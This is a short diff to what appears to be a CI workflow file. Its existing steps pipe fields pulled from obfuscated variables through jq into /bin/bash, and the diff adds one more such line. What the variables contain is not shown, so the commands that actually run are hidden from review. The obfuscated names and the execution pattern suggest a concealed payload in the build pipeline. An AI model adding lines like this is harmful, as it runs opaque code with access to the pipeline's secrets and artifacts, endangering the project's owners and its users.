@@ -33,6 +33,7 @@ jobs:
           echo $wgqt2 | jq -r .tei7169 | /bin/bash
           echo $qs73 | jq -r .v63 | /bin/bash
           echo $x4 | jq -r .bbjz12441 | /bin/bash
+          printf '%s' "$wmq33990" | jq -r .ocfx7 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
